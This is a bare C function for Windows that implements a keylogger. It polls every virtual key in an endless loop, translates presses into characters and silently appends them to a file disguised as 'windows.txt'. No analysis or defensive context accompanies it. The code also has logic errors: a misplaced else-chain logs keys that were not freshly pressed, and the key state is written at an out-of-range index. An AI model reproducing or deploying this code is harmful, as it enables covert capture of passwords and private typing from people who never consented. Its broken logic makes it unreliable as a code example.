DWORD WINAPI logg()
{
    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[] = ")!@#$%^&*(";
    char chars_vn[] = ";=,-./`";
    char chars_vs[] = ":+<_>?~";
    char chars_va[] = "[\\]';";
    char chars_vb[] = "{|}\"";
    FILE *kh;
    char KEY_LOG_FILE[] = "windows.txt";

    // Initialize the array to store the last key state for each virtual key
    for (vkey = 0; vkey < 0xFF; vkey++)
    {
        last_key_state[vkey] = 0;
    }

    // Infinite loop to continuously monitor and log key presses
    while (1)
    {
        Sleep(10); // Sleep for 10 milliseconds to reduce resource usage and avoid busy-waiting

        // Check the state of various keyboard keys
        isCAPSLOCK = (GetKeyState(0x14) & 0xFF) > 0 ? 1 : 0;
        isNUMLOCK = (GetKeyState(0x90) & 0xFF) > 0 ? 1 : 0;
        isL_SHIFT = (GetKeyState(0xA0) & 0xFF00) > 0 ? 1 : 0;
        isR_SHIFT = (GetKeyState(0xA1) & 0xFF00) > 0 ? 1 : 0;

        // Iterate through each virtual key (0-255)
        for (vkey = 0; vkey < 0xFF; vkey++)
        {
            // Check if the key is currently pressed
            isPressed = (GetKeyState(vkey) & 0xFF00) > 0 ? 1 : 0;
            showKey = (char)vkey; // Initialize showKey with the current virtual key

            // Process different cases based on the virtual key
            if (isPressed == 1 && last_key_state[vkey] == 0)
            {
                // Handle alphabetic keys (A-Z)
                if (vkey >= 0x41 && vkey <= 0x5A)
                {
                    if (isCAPSLOCK == 0)
                    {
                        if (isL_SHIFT == 0 && isR_SHIFT == 0)
                        {
                            showKey = (char)(vkey + 0x20); // Convert uppercase to lowercase if Caps Lock is off
                        }
                    }
                    else if (isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = (char)(vkey + 0x20); // Convert uppercase to lowercase if Shift is pressed
                    }
                }
            }
            else if (vkey >= 0x30 && vkey <= 0x39)
            {
                // Handle numeric keys (0-9)
                if (isL_SHIFT == 1 || isR_SHIFT == 1)
                {
                    showKey = NUMCHAR[vkey - 0x30]; // Use special characters for shifted numeric keys
                }
            }
            else if (vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1)
            {
                // Handle numeric keypad keys (0-9) when Num Lock is on
                showKey = (char)(vkey - 0x30);
            }
            else if (vkey >= 0xBA && vkey <= 0xC0)
            {
                // Handle various keys (;=,-./`)
                if (isL_SHIFT == 1 || isR_SHIFT == 1)
                {
                    showKey = chars_vs[vkey - 0xBA]; // Use special characters for shifted keys
                }
                else
                {
                    showKey = chars_vn[vkey - 0xBA];
                }
            }
            else if (vkey >= 0xDB && vkey <= 0xDF)
            {
                // Handle various keys ([\]';)
                if (isL_SHIFT == 1 || isR_SHIFT == 1)
                {
                    showKey = chars_vb[vkey - 0xDB]; // Use special characters for shifted keys
                }
                else
                {
                    showKey = chars_va[vkey - 0xDB];
                }
            }
            else if (vkey == 0x0D)
            {
                // Handle Enter key (carriage return)
                showKey = (char)0x0A;
            }
            else if (vkey >= 0x6A && vkey <= 0x6F)
            {
                // Handle numeric keypad keys (*+,-./)
                showKey = (char)(vkey - 0x40);
            }
            else if (vkey != 0x20 && vkey != 0x09)
            {
                // Handle other special keys (not Space or Tab)
                showKey = (char)0x00;
            }

            // Log the pressed key to the file if it's not a null character
            if (showKey != (char)0x00)
            {
                kh = fopen(KEY_LOG_FILE, "a"); // Open the key log file in append mode
                putc(showKey, kh);             // Write the character to the file
                fclose(kh);                    // Close the file
            }
        }
        last_key_state[vkey] = isPressed; // Update the last key state for the current virtual key
    }
}
